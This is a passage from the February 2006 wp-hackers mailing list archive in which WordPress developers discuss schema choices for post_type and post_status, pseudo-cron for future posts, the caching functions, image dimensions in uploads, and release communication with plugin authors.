Date: Thu Feb  9 07:55:57 2006
Subject: [wp-hackers] New Trac list
In-Reply-To: <43EAF0CF.4010800@mullenweg.com>
References: <43EAF0CF.4010800@mullenweg.com>
Message-ID: <5aa3aa0602082354v1c8e5f7fx4b470efb551acd34@mail.gmail.com>

Whew! Finally a way to fill that 96% gap in my Gmail Inbox...

Craig.
From munnday at gmail.com  Thu Feb  9 08:21:51 2006
From: munnday at gmail.com (David Munn)
Date: Thu Feb  9 08:24:10 2006
Subject: [wp-hackers] New Trac list
In-Reply-To: <43EAF0CF.4010800@mullenweg.com>
References: <43EAF0CF.4010800@mullenweg.com>
Message-ID: <43EAFB9F.9020406@gmail.com>

As if all the other WP related lists are not enough!  Sign me up son!!

Matt Mullenweg wrote:
> Have you ever said to yourself, "I don't get enough email."
> 
> Is your Thunderbird a little lonely?
> 
> Does Gmail mock you with how much free space it has?
> 
> Join the new wp-trac list! Get a message whenever anyone in the world 
> modifies a trac.wordpress.org ticket!
> 
> http://lists.automattic.com/mailman/listinfo/wp-trac
> 
From ryan at boren.nu  Thu Feb  9 10:09:17 2006
From: ryan at boren.nu (Ryan Boren)
Date: Thu Feb  9 10:10:55 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <1139430518.1474.29.camel@localhost.localdomain>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>
	<1139430518.1474.29.camel@localhost.localdomain>
Message-ID: <43EB14CD.1030806@boren.nu>

Behold the changeset of destruction.

http://trac.wordpress.org/changeset/3510

Feed trac with fixes for any broken bits.

Ryan
From mark.wordpress at txfx.net  Thu Feb  9 10:16:39 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb  9 10:18:12 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EB14CD.1030806@boren.nu>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>
	<1139430518.1474.29.camel@localhost.localdomain>
	<43EB14CD.1030806@boren.nu>
Message-ID: <46F2EB7C-DC91-40FE-9746-66A4B4542ADF@txfx.net>

On Feb 9, 2006, at 5:09 AM, Ryan Boren wrote:

> Behold the changeset of destruction.

::quiver::

What about post_status="future"?  That still on the table?

* Would require pseudo cron
* Would make post queries much faster as well as make them cacheable,  
as the dynamic $now would be eliminated
--
Mark Jaquith
http://txfx.net/


From ryan at boren.nu  Thu Feb  9 10:21:30 2006
From: ryan at boren.nu (Ryan Boren)
Date: Thu Feb  9 10:23:04 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <46F2EB7C-DC91-40FE-9746-66A4B4542ADF@txfx.net>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>	<43EB14CD.1030806@boren.nu>
	<46F2EB7C-DC91-40FE-9746-66A4B4542ADF@txfx.net>
Message-ID: <43EB17AA.7010903@boren.nu>

Mark Jaquith wrote:
> On Feb 9, 2006, at 5:09 AM, Ryan Boren wrote:
> 
>> Behold the changeset of destruction.
> 
> 
> ::quiver::
> 
> What about post_status="future"?  That still on the table?
> 
> * Would require pseudo cron
> * Would make post queries much faster as well as make them cacheable,  
> as the dynamic $now would be eliminated

Would be nice.  I haven't looked at any of the pseudo cron 
implementations that were suggested?  Any preferences?  Want to work up 
a patch?

Ryan
From mark.wordpress at txfx.net  Thu Feb  9 10:45:14 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb  9 10:46:50 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EB17AA.7010903@boren.nu>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>	<43EB14CD.1030806@boren.nu>
	<46F2EB7C-DC91-40FE-9746-66A4B4542ADF@txfx.net>
	<43EB17AA.7010903@boren.nu>
Message-ID: <B4741493-1506-4B91-9C01-33B442849EB8@txfx.net>

On Feb 9, 2006, at 5:21 AM, Ryan Boren wrote:

> Would be nice.  I haven't looked at any of the pseudo cron  
> implementations that were suggested?  Any preferences?  Want to  
> work up a patch?

My thoughts (many of which are not original... just condensing):

* Specificity of fewer than 5 minutes might be overkill
* Create wp-cron.php?key=[uniquemd5] so power users with real cron  
can set it to wget that file so that pseudo cron is never fired on a  
user-requested load
* Hooks for arbitrary time increments would be cool.   
"every_X_minutes" ... "every_X_hours" ... "every_X_days"
* WordPress would use it to
	# publish "future" posts
	# do periodic (weekly?) cleanup operations like:
		+ Recalculate category/comment/post counts that may be off because  
of plugins not using the API
		+ Perform misc checks for problems, and notify the admin
	# clean out old "spam" comments
	# check for plugin/WP updates
	# download Dashboard feeds
	# send pings/trackbacks for future posts when they are published

--
Mark Jaquith
http://txfx.net/


From ringmaster at midnightcircus.com  Thu Feb  9 14:18:38 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Feb  9 14:19:30 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EB14CD.1030806@boren.nu>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>
	<43EB14CD.1030806@boren.nu>
Message-ID: <43EB4F3E.8090604@midnightcircus.com>

Ryan Boren wrote:
> Behold the changeset of destruction.
> 
> http://trac.wordpress.org/changeset/3510
> 

Curious on this one point:

Why is post_type a varchar(100) and not an enum('post','page', 
'attachment')?  Wouldn't that be faster?

Owen





From lists at abhaykumar.net  Thu Feb  9 14:41:27 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Thu Feb  9 14:42:59 2006
Subject: [wp-hackers] imgsize in upload.php
In-Reply-To: <0bbc01c62d27$1b0ba400$6801a8c0@AUSTIN>
References: <5aa3aa0602081337j390a86a2l9d1396c76a8509f9@mail.gmail.com>
	<0bbc01c62d27$1b0ba400$6801a8c0@AUSTIN>
Message-ID: <512061b90602090641q5c854ee5m772628b029e34a47@mail.gmail.com>

Could someone clarify why we wouldn't want some backend php code [e.g.
imagesx($img), imagesy($img)], to calculate the images parameters? Is
it becuase we don't want to depend upon php_gd?

Also, I could understand why one would want to define the image's
dimensions (or maybe the width dimension/relative size) for the image
to appear correctly within a post, but the full height and width? I
don't see the purpose. Perhaps I'm being shortsighted.

Abhay

On 2/8/06, Dion Almaer <dion@almaer.com> wrote:
> Craig,
>
> You are right about the border="0" for the generic case.
>
> It was pragmatic in my situation.
>
> I care more about the width/height being put in programatically.
>
> Cheers,
>
> Dion
>
>
> > -----Original Message-----
> > From: wp-hackers-bounces@lists.automattic.com
> > [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of Craig
> > Sent: Wednesday, February 08, 2006 3:38 PM
> > To: wp-hackers@lists.automattic.com
> > Subject: Re: [wp-hackers] imgsize in upload.php
> >
> > My comment to this is wondering about the border="0"
> > declaration. Would that override any CSS styling created by
> > the active site theme? I would offer the opinion that styling
> > should be in the CSS file(s) and not the code itself.
> >
> > Craig.
> > Nuclear Moose.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Abhay Kumar
http://abhaykumar.net/
From mhancock at us.net  Thu Feb  9 15:21:08 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Thu Feb  9 15:22:46 2006
Subject: [wp-hackers] WP No longer display user emails
References: <43E743CA.2060707@phunky.co.uk>	<78279364-50D0-4DCB-8254-1016EF8B1B6B@txfx.net>	<43E866DC.6040608@phunky.co.uk><5C4A03AC-543D-4956-9424-C4380DAC0DD4@txfx.net>
	<43E88AA6.6070709@phunky.co.uk>
Message-ID: <043201c62d8c$74cf6ca0$6402a8c0@DELL8600>

From: "Mark Harwood" <mark@phunky.co.uk>
> Ive disabled all custom plugins and it still refuses to pull back the 
> email in the $userdata->object

This in author.php is working at 2.0.1:

<?php
if(isset($_GET['author_name'])) :
$curauth = get_userdatabylogin($author_name);
else :
$curauth = get_userdata(intval($author));
endif;
?>

<h2>Posts by <?php echo $curauth->nickname; ?></h2>
Email is <?php echo $curauth->user_email; ?>



Michael E. Hancock

From davebytes at comcast.net  Thu Feb  9 15:43:38 2006
From: davebytes at comcast.net (David Chait)
Date: Thu Feb  9 15:45:14 2006
Subject: [wp-hackers] post_status and post_type
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain><43EB14CD.1030806@boren.nu>
	<43EB4F3E.8090604@midnightcircus.com>
Message-ID: <003401c62d8f$990988f0$6e01a8c0@sixfour>

I can give a personal opinion on why I'd prefer it as-is.  While enums may 
be faster, varchars are extensible on-the-fly (i.e. plugins).  It was a pain 
when I found comment tagging as an enum with ('0','1','spam') -- which means 
my anti-spam plugin can't use the existing moderation field for tagging 
'potential spam' in grades without a secondary table.  Maybe I might come up 
with a plugin that manages a new post type, new content type.  I find 
varchars useful for more open expansion, while enums are good if you really 
have a fixed field and want the code and db to be more readable ('string' 
rathing than 'index').  Of course, varchars are just as readable. ;)  It's 
that an index field (say 1-3) is less readable than an enum 
('do','re','mi').

I would assume by the nature of an enum it should be faster -- there is 
still some kind of conversion going on matching input in a query to the enum 
'slots' and converting to the corresponding index then doing the 
select/insert, versus no conversion just a string select/insert.  If it's 
really a numeric field under the covers, should be somewhat faster -- though 
string compares on exact matches can be pretty fast (4 chars at a time on a 
32-bit system, assuming no hash or anything to further accelerate).

Anyhow, I'd like to see more things pop out of enums unless critically 
needed to prevent coding errors (which could also be done by defining an 
array of possible values in the code, and allowing plugins to 'add' 
potential values to match, then doing a sanity-compare against the array as 
needed... slower, but infinitely extensible without changing the DB schema).

-d

----- Original Message ----- 
From: "Owen Winkler" <ringmaster@midnightcircus.com>
To: <wp-hackers@lists.automattic.com>
Sent: Thursday, February 09, 2006 9:18 AM
Subject: Re: [wp-hackers] post_status and post_type


| Ryan Boren wrote:
| > Behold the changeset of destruction.
| >
| > http://trac.wordpress.org/changeset/3510
| >
|
| Curious on this one point:
|
| Why is post_type a varchar(100) and not an enum('post','page',
| 'attachment')?  Wouldn't that be faster? 

From choan.galvez at gmail.com  Thu Feb  9 15:44:35 2006
From: choan.galvez at gmail.com (=?UTF-8?Q?Choan_C=2E_G=C3=A1lvez?=)
Date: Thu Feb  9 15:46:08 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EB4F3E.8090604@midnightcircus.com>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
	<1139396935.5565.20.camel@localhost.localdomain>
	<ebe43d680602080608g4fb58d74k@mail.gmail.com>
	<1139428641.1474.15.camel@localhost.localdomain>
	<43EA5318.6030500@midnightcircus.com>
	<1139430518.1474.29.camel@localhost.localdomain>
	<43EB14CD.1030806@boren.nu> <43EB4F3E.8090604@midnightcircus.com>
Message-ID: <34dea5010602090744w36fce2d6ob4c6501b01defad9@mail.gmail.com>

On 2/9/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Ryan Boren wrote:
> > Behold the changeset of destruction.
> >
> > http://trac.wordpress.org/changeset/3510
> >
>
> Curious on this one point:
>
> Why is post_type a varchar(100) and not an enum('post','page',
> 'attachment')?  Wouldn't that be faster?

Faster, probably.

I've been playing recently with Drupal, and do you know what? The
`nodes` table (more or less equivalent to WP `wp_posts`) contains a
`type` field.

This allows programmers to define new content types. Why should WP
restrict "types" to `post` and `page`?

--
Choan
From nuclearmoose at gmail.com  Thu Feb  9 16:01:23 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb  9 16:04:42 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <34dea5010602090744w36fce2d6ob4c6501b01defad9@mail.gmail.com>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
	<1139396935.5565.20.camel@localhost.localdomain>
	<ebe43d680602080608g4fb58d74k@mail.gmail.com>
	<1139428641.1474.15.camel@localhost.localdomain>
	<43EA5318.6030500@midnightcircus.com>
	<1139430518.1474.29.camel@localhost.localdomain>
	<43EB14CD.1030806@boren.nu> <43EB4F3E.8090604@midnightcircus.com>
	<34dea5010602090744w36fce2d6ob4c6501b01defad9@mail.gmail.com>
Message-ID: <5aa3aa0602090801u21c0f7dr3e0545f343109dbf@mail.gmail.com>

Choan said:
"This allows programmers to define new content types. Why should WP
restrict "types" to `post` and `page`?"

This is an especially valid point given the recent interest in WP-as-a-CMS
thread. I'd be willing to guess that this is something that will soon
change! :^)

Craig.
From jeff at jrm.cc  Thu Feb  9 16:23:26 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Thu Feb  9 16:25:10 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EB4F3E.8090604@midnightcircus.com>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>	<43EB14CD.1030806@boren.nu>
	<43EB4F3E.8090604@midnightcircus.com>
Message-ID: <43EB6C7E.4090906@jrm.cc>

Owen Winkler wrote:
> Why is post_type a varchar(100) and not an enum('post','page', 
> 'attachment')?  Wouldn't that be faster?

Yes, enums are faster.

1) enums are a psuedo look-up table. MySQL stores a smallint val for 
each enum and uses that when doing lookups. It's kind of like having a 
lookup table and doing a join across them, except that mysql does it all 
for you.

2) this means enums are compared, internally, as ints -- a much faster 
query for mysql

3) it also means smaller storage space

4) it, consequently, means smaller index size

So, yes, enums *are* faster -- but by how much at the cost of locking 
the "post types" down, is the real question. Probably not enough for the 
vast majority of wordpress installs.

(Flip side of this arguement is: authors, have your plugins modify the 
DB upon run to check for the enum def, if not there modify to add it. 
SUPER problematic, but possible.)


I like the ideas stated later in the thread of leaving it a varchar to 
allow others to make up their own post types. The only complication this 
involves is whether or not WP would edit non-standard post_types or not. 
Lot's of queries would be needing some updating to make sure they're 
only pulling "post" post_types and so forth.

Also...

Mark Jaquith wrote:
> What about post_status="future"?  That still on the table?

+145,000,000

As otherwise stated, death to all "< $now" clauses.

Jeff
From lists at viper007bond.com  Thu Feb  9 16:30:40 2006
From: lists at viper007bond.com (Viper007Bond)
Date: Thu Feb  9 16:32:19 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E20098A19FC@ucmail6.ad.uc.edu>
References: <E7340445E0595A418B2F8DE0AE480E20098A19FC@ucmail6.ad.uc.edu>
Message-ID: <43EB6E30.3020904@viper007bond.com>

It's a plugin. I've modified it to show the times of all posts rather 
than just the last 30 days / posts / whatever it was, but still. :)

http://www.viper007bond.com/about/plugins-used/

It's the "Blogtimes" plugin by Matt.

- Viper

Vogel, Andrew (vogelap) wrote:
> How did you get the "Post by Hour" graph at the top of that page? That's
> cool. I'd like that on www.drewvogel.com.
> 
> -andrew vogel
> Manager of Professional Programs
> University of Cincinnati
> College of Pharmacy 
>  
> 
>> -----Original Message-----
>> From: wp-hackers-bounces@lists.automattic.com 
>> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
>> Viper007Bond
>> Sent: Wednesday, February 08, 2006 10:38 AM
>> To: WordPress Hackers Mailing List
>> Subject: [wp-hackers] Documentation on the caching functions?
>>
>> I'm using the SRG Clean Archives plugin ( 
>> http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug
> -in/ ) on my blog and it's starting to get up into the couple > hundred
> queries area when I load the page I have it on.
>> So, I want to cache it. I know that get_settings() and all 
>> those use caching, but how can I cache directly without 
>> storing it in the database?
>>
>> I see wp_cache_get() and wp_cache_set() in the source code, 
>> but what else is there and is there any documentation on them 
>> (simple is all I need)?
>>
>> TIA. :)
>>
>> - Viper007Bond
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From lists at viper007bond.com  Thu Feb  9 16:38:01 2006
From: lists at viper007bond.com (Viper007Bond)
Date: Thu Feb  9 16:39:34 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <00f201c62cc8$4edd38c0$6e01a8c0@sixfour>
References: <43EA1053.3090807@viper007bond.com>
	<00f201c62cc8$4edd38c0$6e01a8c0@sixfour>
Message-ID: <43EB6FE9.7060301@viper007bond.com>

Thanks, but I was looking for something a bit more elegant.

I mean, I'm not really looking for a quick and dirty hack here. I know 
what I'm doing when it comes to WordPress plugins, so it's not like 
coding this up will be hard by any means. I just don't know how to use 
the new caching functions (parameters and such) and thought I'd ask 
before I went source reading to learn how they work. ;)

- Viper

David Chait wrote:
> You could set up WP-Cache, and have it ONLY cache that page (if you get 
> tricky...).  That might be the easiest solution.
> 
> -d
> 
> ----- Original Message ----- 
> From: "Viper007Bond" <lists@viper007bond.com>
> To: "WordPress Hackers Mailing List" <wp-hackers@lists.automattic.com>
> Sent: Wednesday, February 08, 2006 10:37 AM
> Subject: [wp-hackers] Documentation on the caching functions?
> 
> 
> | I'm using the SRG Clean Archives plugin (
> | http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug-in/ ) on
> | my blog and it's starting to get up into the couple hundred queries area
> | when I load the page I have it on.
> |
> | So, I want to cache it. I know that get_settings() and all those use
> | caching, but how can I cache directly without storing it in the database?
> |
> | I see wp_cache_get() and wp_cache_set() in the source code, but what
> | else is there and is there any documentation on them (simple is all I 
> need)?
> |
> | TIA. :)
> |
> | - Viper007Bond
> | _______________________________________________
> | wp-hackers mailing list
> | wp-hackers@lists.automattic.com
> | http://lists.automattic.com/mailman/listinfo/wp-hackers
> | 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From VOGELAP at UCMAIL.UC.EDU  Thu Feb  9 16:42:12 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Thu Feb  9 16:44:41 2006
Subject: [wp-hackers] Documentation on the caching functions?
Message-ID: <E7340445E0595A418B2F8DE0AE480E200995B8DF@ucmail6.ad.uc.edu>

Thanks!

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Viper007Bond
> Sent: Thursday, February 09, 2006 11:31 AM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Documentation on the caching functions?
> 
> It's a plugin. I've modified it to show the times of all 
> posts rather than just the last 30 days / posts / whatever it 
> was, but still. :)
> 
> http://www.viper007bond.com/about/plugins-used/
> 
> It's the "Blogtimes" plugin by Matt.
> 
> - Viper
> 
> Vogel, Andrew (vogelap) wrote:
> > How did you get the "Post by Hour" graph at the top of that page? 
> > That's cool. I'd like that on www.drewvogel.com.
> > 
> > -andrew vogel
> > Manager of Professional Programs
> > University of Cincinnati
> > College of Pharmacy
> >  
> > 
> >> -----Original Message-----
> >> From: wp-hackers-bounces@lists.automattic.com
> >> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> >> Viper007Bond
> >> Sent: Wednesday, February 08, 2006 10:38 AM
> >> To: WordPress Hackers Mailing List
> >> Subject: [wp-hackers] Documentation on the caching functions?
> >>
> >> I'm using the SRG Clean Archives plugin ( 
> >> http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug
> > -in/ ) on my blog and it's starting to get up into the couple > 
> > hundred queries area when I load the page I have it on.
> >> So, I want to cache it. I know that get_settings() and all 
> those use 
> >> caching, but how can I cache directly without storing it in the 
> >> database?
> >>
> >> I see wp_cache_get() and wp_cache_set() in the source 
> code, but what 
> >> else is there and is there any documentation on them 
> (simple is all I 
> >> need)?
> >>
> >> TIA. :)
> >>
> >> - Viper007Bond
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers@lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From VOGELAP at UCMAIL.UC.EDU  Thu Feb  9 16:45:32 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Thu Feb  9 16:46:46 2006
Subject: [wp-hackers] Documentation on the caching functions?
Message-ID: <E7340445E0595A418B2F8DE0AE480E200995B8E7@ucmail6.ad.uc.edu>

Hrm... How do I call the plugin from the page where I want it displayed?

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Viper007Bond
> Sent: Thursday, February 09, 2006 11:31 AM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Documentation on the caching functions?
> 
> It's a plugin. I've modified it to show the times of all 
> posts rather than just the last 30 days / posts / whatever it 
> was, but still. :)
> 
> http://www.viper007bond.com/about/plugins-used/
> 
> It's the "Blogtimes" plugin by Matt.
> 
> - Viper
> 
> Vogel, Andrew (vogelap) wrote:
> > How did you get the "Post by Hour" graph at the top of that page? 
> > That's cool. I'd like that on www.drewvogel.com.
> > 
> > -andrew vogel
> > Manager of Professional Programs
> > University of Cincinnati
> > College of Pharmacy
> >  
> > 
> >> -----Original Message-----
> >> From: wp-hackers-bounces@lists.automattic.com
> >> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> >> Viper007Bond
> >> Sent: Wednesday, February 08, 2006 10:38 AM
> >> To: WordPress Hackers Mailing List
> >> Subject: [wp-hackers] Documentation on the caching functions?
> >>
> >> I'm using the SRG Clean Archives plugin ( 
> >> http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug
> > -in/ ) on my blog and it's starting to get up into the couple > 
> > hundred queries area when I load the page I have it on.
> >> So, I want to cache it. I know that get_settings() and all 
> those use 
> >> caching, but how can I cache directly without storing it in the 
> >> database?
> >>
> >> I see wp_cache_get() and wp_cache_set() in the source 
> code, but what 
> >> else is there and is there any documentation on them 
> (simple is all I 
> >> need)?
> >>
> >> TIA. :)
> >>
> >> - Viper007Bond
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers@lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From dougal at gunters.org  Thu Feb  9 18:19:43 2006
From: dougal at gunters.org (Dougal Campbell)
Date: Thu Feb  9 18:21:47 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <43EB6FE9.7060301@viper007bond.com>
References: <43EA1053.3090807@viper007bond.com>	<00f201c62cc8$4edd38c0$6e01a8c0@sixfour>
	<43EB6FE9.7060301@viper007bond.com>
Message-ID: <43EB87BF.3000906@gunters.org>

Viper007Bond wrote:
> Thanks, but I was looking for something a bit more elegant.
> 
> I mean, I'm not really looking for a quick and dirty hack here. I know 
> what I'm doing when it comes to WordPress plugins, so it's not like 
> coding this up will be hard by any means. I just don't know how to use 
> the new caching functions (parameters and such) and thought I'd ask 
> before I went source reading to learn how they work. ;)

I had the same question recently. After looking at cache.php, and 
associated bits of code, I was pretty sure I had the idea. I emailed 
Ryan, and he confirmed that pretty much all you need are the 
wp_cache_set() and wp_cache_get() functions. Message attached.

-- 
Dougal Campbell <dougal@gunters.org>
http://dougal.gunters.org/

From agent_eight at hotmail.com  Thu Feb  9 18:38:10 2006
From: agent_eight at hotmail.com (Christopher Johnson)
Date: Thu Feb  9 18:39:44 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
Message-ID: <BAY106-F30CDD47C2B00BD22C1F0B39E030@phx.gbl>

Had anyone ever considered using a modified pre-order tree to store the post 
categories in? I realize it would mean rewriting several large swaths of 
code in addition to a tool to convert adjacency<->tree.

With all the posts and plugins I've seen relating to filtering and/or 
excluding posts by category ... it would seem that a modifed preorder tree 
would not only simpify queries but would be more "read" efficient. Had this 
ever come up?


From tunicwriter at gmail.com  Thu Feb  9 19:48:04 2006
From: tunicwriter at gmail.com (Joey B)
Date: Thu Feb  9 19:49:54 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <1139428294.1474.11.camel@localhost.localdomain>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
Message-ID: <6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>

There's not a lot a plugin author can do during the beta phase since
things are bound to change, and whatever work is accomplished will
more than likely be undone by time the final product is released.

On top of that, the RC was announced on *checks the date* December
20th, with 2.0 officially being announced on the 31st. However, if I
recall correctly, it was out on the 26th. So saying the process was
months long, while true, seems a bit misleading, considering, again
with the beta process, and that the RC announcement was 6 days prior
to the release. Furthermore, I'm not positive of how many people
actually subscribe to wp-testers, but I know not that many people show
up for the IRC Meetups. I'd say a good 15-20 or so on average, which
is obviously no where near the amount of plugin authors out there.

On 2/8/06, Ryan Boren <ryan@boren.nu> wrote:
> On Wed, 2006-02-08 at 14:10 +0000, David House wrote:
> > On 08/02/06, Ryan Duff <ryan@ryanduff.net> wrote:
> > > Advance notifications would be nice. Oh wait, I guess your logic is most
> > > plugin authors don't follow the hackers list, therefore, why make an
> > > announcement or have a public beta so they can fix things.
> >
> > We could have a mailing list for plugin authors to subscribe to that
> > only posted preview release announcements. Or, we could put it on the
> > devblog with a big disclaimer: 'do not actually install, for plugin
> > authors only'.
>
> We do need to do better with release planning, but the beta and RC cycle
> for 2.0 was months long and several announcements were made.  The RC
> was announced on the dev blog.  Several announcements were made to the
> testers list.  The weekly IRC meetup discussed the releases.
>
> For 2.1, we need to try to nail down a release schedule.  The schedule
> can always be changed if needed, but having even a moving target is
> nice.
>
> Ryan
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Joey Brooks
Milk Carton Designs || milkcartondesigns.com
From skeltoac at gmail.com  Thu Feb  9 20:33:13 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb  9 20:34:47 2006
Subject: [wp-hackers] imgsize in upload.php
In-Reply-To: <512061b90602090641q5c854ee5m772628b029e34a47@mail.gmail.com>
References: <5aa3aa0602081337j390a86a2l9d1396c76a8509f9@mail.gmail.com>
	<0bbc01c62d27$1b0ba400$6801a8c0@AUSTIN>
	<512061b90602090641q5c854ee5m772628b029e34a47@mail.gmail.com>
Message-ID: <e6ec604d0602091233i4b1c1427se80bdca392bce2fc@mail.gmail.com>

On 2/9/06, Abhay Kumar <lists@abhaykumar.net> wrote:
> Also, I could understand why one would want to define the image's
> dimensions (or maybe the width dimension/relative size) for the image
> to appear correctly within a post, but the full height and width? I
> don't see the purpose. Perhaps I'm being shortsighted.

If the image fails to load, its absence will cause the surrounding
text etc. to flow differently. Sometimes that's bad. The effect can be
avoided by specifying the height and width attributes.

Andy
From nuclearmoose at gmail.com  Thu Feb  9 22:20:28 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb  9 22:22:04 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
